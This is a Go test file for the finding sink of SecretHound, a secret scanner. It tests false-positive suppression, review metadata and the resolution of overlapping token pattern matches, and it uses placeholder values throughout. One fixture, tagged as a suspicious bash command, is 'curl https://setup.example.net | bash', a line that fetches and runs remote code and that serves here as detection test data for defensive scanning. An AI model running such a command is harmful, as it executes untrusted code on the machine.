package pipeline

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/rafabd1/SecretHound/core/finding"
	"github.com/rafabd1/SecretHound/core/patterns"
	"github.com/rafabd1/SecretHound/core/semantic"
	"github.com/rafabd1/SecretHound/output"
)

type sinkClassifier struct{}

func (sinkClassifier) Classify(_ context.Context, candidates []semantic.Candidate) ([]semantic.Prediction, error) {
	predictions := make([]semantic.Prediction, len(candidates))
	for i, candidate := range candidates {
		switch candidate.Value {
		case "placeholder-value":
			predictions[i] = semantic.Prediction{Verdict: semantic.VerdictLikelyFalsePositive, Score: 0.97}
		case "uncertain-value":
			predictions[i] = semantic.Prediction{Verdict: semantic.VerdictUncertain, Score: 0.49}
		default:
			predictions[i] = semantic.Prediction{Verdict: semantic.VerdictNotLikelyFalsePositive, Score: 0.94}
		}
	}
	return predictions, nil
}

func (sinkClassifier) Close() error { return nil }

type occurrenceSinkClassifier struct{}

func (occurrenceSinkClassifier) Classify(_ context.Context, candidates []semantic.Candidate) ([]semantic.Prediction, error) {
	predictions := make([]semantic.Prediction, len(candidates))
	for i, candidate := range candidates {
		if strings.Contains(candidate.Context, "example_key") {
			predictions[i] = semantic.Prediction{Verdict: semantic.VerdictLikelyFalsePositive, Score: 0.98}
		} else {
			predictions[i] = semantic.Prediction{Verdict: semantic.VerdictUncertain, Score: 0.51}
		}
	}
	return predictions, nil
}

func (occurrenceSinkClassifier) Close() error { return nil }

func TestSinkSuppressesOnlyLikelyFalsePositives(t *testing.T) {
	path := filepath.Join(t.TempDir(), "results.json")
	writer, err := output.NewWriter(path, false, false)
	if err != nil {
		t.Fatal(err)
	}
	filter := semantic.NewFilter(sinkClassifier{}, semantic.FilterConfig{
		BatchWait:                    time.Millisecond,
		ClassificationTimeout:        time.Second,
		SuppressLikelyFalsePositives: true,
	})
	patternManager := patterns.NewPatternManager()
	if err := patternManager.LoadPatterns(nil, nil); err != nil {
		t.Fatal(err)
	}
	sink := NewSink(patternManager, writer, output.NewLogger(false, true), filter, false)

	result, err := sink.Process(context.Background(), "file://config.js", []finding.Finding{
		{Type: "api_key_assignment", Value: "placeholder-value", URL: "file://config.js", Line: 1},
		{Type: "api_key_assignment", Value: "uncertain-value", URL: "file://config.js", Line: 2},
		{Type: "api_key_assignment", Value: "real-value", URL: "file://config.js", Line: 3},
		{Type: "url_generic", Value: "https://api.example.net/v1", URL: "file://config.js", Line: 4},
		{Type: "bash_command_suspicious", Value: "curl https://setup.example.net | bash", URL: "file://config.js", Line: 5},
	})
	if err != nil {
		t.Fatal(err)
	}
	if result.Detected != 5 || result.Emitted != 4 || result.Suppressed != 1 {
		t.Fatalf("unexpected sink result: %+v", result)
	}
	if err := filter.Close(); err != nil {
		t.Fatal(err)
	}
	if err := writer.Close(); err != nil {
		t.Fatal(err)
	}

	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	var stored []output.SecretFindingData
	if err := json.Unmarshal(data, &stored); err != nil {
		t.Fatal(err)
	}
	if len(stored) != 4 {
		t.Fatalf("stored %d findings, expected 4", len(stored))
	}
	foundURL := false
	foundCommand := false
	for _, item := range stored {
		if item.Value == "placeholder-value" {
			t.Fatal("suppressed false positive was written")
		}
		if item.Value == "https://api.example.net/v1" {
			foundURL = true
			if item.FilterStatus != "" || item.ReviewPriority != "" {
				t.Fatalf("URL finding was semantically classified: %+v", item)
			}
		}
		if item.Value == "curl https://setup.example.net | bash" {
			foundCommand = true
			if item.FilterStatus != "" || item.ReviewPriority != "" {
				t.Fatalf("command finding was semantically classified: %+v", item)
			}
		}
	}
	if !foundURL {
		t.Fatal("URL finding was not stored")
	}
	if !foundCommand {
		t.Fatal("command finding was not stored")
	}
}

func TestSinkMarksLikelyFalsePositiveInNonSuppressingMode(t *testing.T) {
	path := filepath.Join(t.TempDir(), "results.json")
	writer, err := output.NewWriter(path, false, false)
	if err != nil {
		t.Fatal(err)
	}
	filter := semantic.NewFilter(sinkClassifier{}, semantic.FilterConfig{
		BatchWait:             time.Millisecond,
		ClassificationTimeout: time.Second,
	})
	patternManager := patterns.NewPatternManager()
	if err := patternManager.LoadPatterns(nil, nil); err != nil {
		t.Fatal(err)
	}
	sink := NewSink(patternManager, writer, output.NewLogger(false, true), filter, false)

	result, err := sink.Process(context.Background(), "file://config.js", []finding.Finding{
		{Type: "api_key_assignment", Value: "placeholder-value", URL: "file://config.js", Line: 1},
	})
	if err != nil {
		t.Fatal(err)
	}
	if result.Emitted != 1 || result.Suppressed != 0 {
		t.Fatalf("unexpected sink result: %+v", result)
	}
	if err := filter.Close(); err != nil {
		t.Fatal(err)
	}
	if err := writer.Close(); err != nil {
		t.Fatal(err)
	}

	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	var stored []output.SecretFindingData
	if err := json.Unmarshal(data, &stored); err != nil {
		t.Fatal(err)
	}
	if len(stored) != 1 || stored[0].FilterStatus != "likely_false_positive" || stored[0].ReviewPriority != "low" {
		t.Fatalf("false-positive metadata missing: %+v", stored)
	}
}

func TestSinkWritesDistinctVerdictsForRepeatedValueOccurrences(t *testing.T) {
	path := filepath.Join(t.TempDir(), "results.json")
	writer, err := output.NewWriter(path, false, false)
	if err != nil {
		t.Fatal(err)
	}
	filter := semantic.NewFilter(occurrenceSinkClassifier{}, semantic.FilterConfig{
		BatchWait:             time.Millisecond,
		ClassificationTimeout: time.Second,
	})
	patternManager := patterns.NewPatternManager()
	if err := patternManager.LoadPatterns(nil, nil); err != nil {
		t.Fatal(err)
	}
	sink := NewSink(patternManager, writer, output.NewLogger(false, true), filter, false)

	value := "same-value"
	exampleContext := `const example_key = "` + value + `"`
	productionContext := `const api_key = "` + value + `"`
	result, err := sink.Process(context.Background(), "file://config.js", []finding.Finding{
		{
			Type:             "api_key_assignment",
			Value:            value,
			URL:              "file://config.js",
			Line:             1,
			ByteOffset:       20,
			Context:          exampleContext,
			ContextOffset:    strings.Index(exampleContext, value),
			HasContextOffset: true,
		},
		{
			Type:             "api_key_assignment",
			Value:            value,
			URL:              "file://config.js",
			Line:             1,
			ByteOffset:       80,
			Context:          productionContext,
			ContextOffset:    strings.Index(productionContext, value),
			HasContextOffset: true,
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	if result.Emitted != 2 || result.Suppressed != 0 {
		t.Fatalf("unexpected sink result: %+v", result)
	}
	if err := filter.Close(); err != nil {
		t.Fatal(err)
	}
	if err := writer.Close(); err != nil {
		t.Fatal(err)
	}

	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	var stored []output.SecretFindingData
	if err := json.Unmarshal(data, &stored); err != nil {
		t.Fatal(err)
	}
	if len(stored) != 2 {
		t.Fatalf("stored %d findings, expected both occurrences: %+v", len(stored), stored)
	}
	byStatus := make(map[string]output.SecretFindingData, len(stored))
	for _, item := range stored {
		byStatus[item.FilterStatus] = item
	}
	if item := byStatus["likely_false_positive"]; item.ByteOffset != 20 || item.ReviewPriority != "low" {
		t.Fatalf("likely-false-positive occurrence was not preserved: %+v", item)
	}
	if item := byStatus["uncertain"]; item.ByteOffset != 80 {
		t.Fatalf("uncertain occurrence was not preserved: %+v", item)
	}
}

func TestSinkResolvesKnownPatternCollisionsBeforeSemanticReview(t *testing.T) {
	patternManager := patterns.NewPatternManager()
	if err := patternManager.LoadPatterns(nil, nil); err != nil {
		t.Fatal(err)
	}
	sink := NewSink(patternManager, nil, output.NewLogger(false, true), nil, false)

	findings := []finding.Finding{
		{Type: "api_key_assignment", Value: "provider-value", URL: "file://config.js", Line: 1},
		{Type: "google_api_key", Value: "provider-value", URL: "file://config.js", Line: 1},
		{Type: "config_api_key", Value: "generic-value", URL: "file://config.js", Line: 2},
		{Type: "api_key_assignment", Value: "generic-value", URL: "file://config.js", Line: 2},
		{Type: "config_secret", Value: "private-value", URL: "file://config.js", Line: 3},
		{Type: "private_key_var", Value: "private-value", URL: "file://config.js", Line: 3},
		{Type: "github_personal_token", Value: "github-value", URL: "file://config.js", Line: 4},
		{Type: "github_token", Value: "github-value", URL: "file://config.js", Line: 4},
		{Type: "llm_kimi_moonshot_api_key", Value: "shared-value", URL: "file://config.js", Line: 5},
		{Type: "llm_qwen_dashscope_api_key", Value: "shared-value", URL: "file://config.js", Line: 5},
	}

	result, err := sink.Process(context.Background(), "file://config.js", findings)
	if err != nil {
		t.Fatal(err)
	}
	if result.Detected != 10 || result.Collapsed != 4 || result.Emitted != 6 {
		t.Fatalf("unexpected sink result: %+v", result)
	}

	resolved := ResolvePatternCollisions(sink.patternManager, findings)
	got := make(map[string]bool, len(resolved))
	for _, item := range resolved {
		got[item.Type] = true
	}
	for _, expected := range []string{
		"google_api_key",
		"api_key_assignment",
		"private_key_var",
		"github_token",
		"llm_kimi_moonshot_api_key",
		"llm_qwen_dashscope_api_key",
	} {
		if !got[expected] {
			t.Errorf("preferred or equal-priority pattern %s was removed", expected)
		}
	}
	for _, removed := range []string{"config_api_key", "config_secret", "github_personal_token"} {
		if got[removed] {
			t.Errorf("lower-priority pattern %s was retained", removed)
		}
	}
}

func TestSinkDoesNotCollapseSameValueAtDifferentLocations(t *testing.T) {
	patternManager := patterns.NewPatternManager()
	sink := NewSink(patternManager, nil, output.NewLogger(false, true), nil, false)
	findings := []finding.Finding{
		{Type: "config_api_key", Value: "same-value", URL: "file://config.js", Line: 1},
		{Type: "api_key_assignment", Value: "same-value", URL: "file://config.js", Line: 2},
		{Type: "google_api_key", Value: "same-value", URL: "file://other.js", Line: 1},
	}

	result, err := sink.Process(context.Background(), "file://config.js", findings)
	if err != nil {
		t.Fatal(err)
	}
	if result.Collapsed != 0 || result.Emitted != len(findings) {
		t.Fatalf("distinct locations were collapsed: %+v", result)
	}
}

func TestSinkDoesNotCollapseSameValueAtDifferentOffsetsOnOneLine(t *testing.T) {
	patternManager := patterns.NewPatternManager()
	sink := NewSink(patternManager, nil, output.NewLogger(false, true), nil, false)
	findings := []finding.Finding{
		{Type: "config_api_key", Value: "same-value", URL: "file://config.js", Line: 1, ByteOffset: 12},
		{Type: "google_api_key", Value: "same-value", URL: "file://config.js", Line: 1, ByteOffset: 72},
	}

	result, err := sink.Process(context.Background(), "file://config.js", findings)
	if err != nil {
		t.Fatal(err)
	}
	if result.Collapsed != 0 || result.Emitted != len(findings) {
		t.Fatalf("distinct offsets on one line were collapsed: %+v", result)
	}
}

func TestSinkPrefersProviderSpecificLLMTypeOverLegacyOpenAIShape(t *testing.T) {
	patternManager := patterns.NewPatternManager()
	sink := NewSink(patternManager, nil, output.NewLogger(false, true), nil, false)
	findings := []finding.Finding{
		{Type: "llm_openai_legacy_api_key", Value: "sk-shared-value", URL: "file://config.js", Line: 1},
		{Type: "llm_kimi_moonshot_api_key", Value: "sk-shared-value", URL: "file://config.js", Line: 1},
	}

	resolved := ResolvePatternCollisions(sink.patternManager, findings)
	if len(resolved) != 1 || resolved[0].Type != "llm_kimi_moonshot_api_key" {
		t.Fatalf("provider-specific LLM type did not win collision: %+v", resolved)
	}
}

func TestSinkPrefersExactSlackTokenOverGenericOAuthToken(t *testing.T) {
	patternManager := patterns.NewPatternManager()
	sink := NewSink(patternManager, nil, output.NewLogger(false, true), nil, false)
	findings := []finding.Finding{
		{Type: "oauth_token", Value: "xoxb-shared-value", URL: "file://config.js", Line: 1, ByteOffset: 16},
		{Type: "slack_token", Value: "xoxb-shared-value", URL: "file://config.js", Line: 1, ByteOffset: 16},
	}

	resolved := ResolvePatternCollisions(sink.patternManager, findings)
	if len(resolved) != 1 || resolved[0].Type != "slack_token" {
		t.Fatalf("exact Slack type did not win collision: %+v", resolved)
	}
}

func TestSinkPrefersDefaultPriorityProviderTokenOverGenericOAuthToken(t *testing.T) {
	patternManager := patterns.NewPatternManager()
	if err := patternManager.LoadPatterns(nil, nil); err != nil {
		t.Fatal(err)
	}
	sink := NewSink(patternManager, nil, output.NewLogger(false, true), nil, false)
	findings := []finding.Finding{
		{Type: "oauth_token", Value: "nfp_shared-provider-value", URL: "file://config.js", Line: 1, ByteOffset: 16},
		{Type: "netlify_access_token", Value: "nfp_shared-provider-value", URL: "file://config.js", Line: 1, ByteOffset: 16},
	}

	resolved := ResolvePatternCollisions(sink.patternManager, findings)
	if len(resolved) != 1 || resolved[0].Type != "netlify_access_token" {
		t.Fatalf("provider token did not win generic OAuth collision: %+v", resolved)
	}
}
